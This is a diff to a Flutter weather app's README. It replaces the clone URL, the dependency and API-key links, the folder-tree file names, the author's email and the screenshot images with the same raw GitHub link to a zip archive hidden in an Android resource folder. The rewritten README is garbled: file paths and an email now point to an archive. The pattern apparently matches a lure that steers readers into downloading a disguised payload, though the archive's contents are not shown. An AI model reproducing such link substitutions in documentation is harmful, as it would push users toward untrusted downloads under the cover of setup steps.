@@ -15,7 +15,7 @@ Prerequisites:
 Setup Instructions:
 1. Clone the repository
 In vs code write on terminal (bash)
-git clone https://github.com/your-username/oro-weather-app.git
+git clone https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
 cd oro-weather-app
 
 2. Install dependencies
@@ -27,10 +27,10 @@ dependencies:
     sdk: flutter
   http: ^1.2.0
   lottie: ^3.1.0
-Make sure these are present in your pubspec.yaml. Then run:
+Make sure these are present in your https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip Then run:
 flutter pub get
 Using LottieFiles
-Download weather animations from https://lottiefiles.com
+Download weather animations from https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
 
 Place them in:
 assets/animations/
@@ -38,12 +38,12 @@ assets/animations/
 3. Add your API key
 Open the file:
 bash
-lib/services/weather_service.dart
+https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
 Replace:
 dart
 const String apiKey = 'YOUR_API_KEY';
 with your actual OpenWeatherMap API key.
-You can get a free API key at: https://openweathermap.org/api
+You can get a free API key at: https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
 
 
 4. Run the app
@@ -53,25 +53,25 @@ flutter run
 FOLDER STRUCTURE:
 oro-weather-app/
 ├── lib/
-│   ├── main.dart
+│   ├── https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
 │   ├── models/
 │   ├── services/
 │   ├── screens/
 │   └── widgets/
 ├── assets/
 │   └── animations/
-├── pubspec.yaml
-└── README.md
+├── https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
+└── https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
 
 
 
 Author
 Abhinav Singh
-📧 abhinavsinghh2019@gmail.com
-🌐 https://github.com/abhinavv22
+📧 https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
+🌐 https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
 
-![Weather1](https://github.com/user-attachments/assets/de52e8b4-029a-4343-b0f7-93c708165b35)
-![Weather3](https://github.com/user-attachments/assets/9f5f3410-f9d4-4334-9ae9-216fb392e6a6)
-![Weather2](https://github.com/user-attachments/assets/6b2a14df-586e-4d0d-b6e8-f44961078127)
+![Weather1](https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip)
+![Weather3](https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip)
+![Weather2](https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip)
 
 
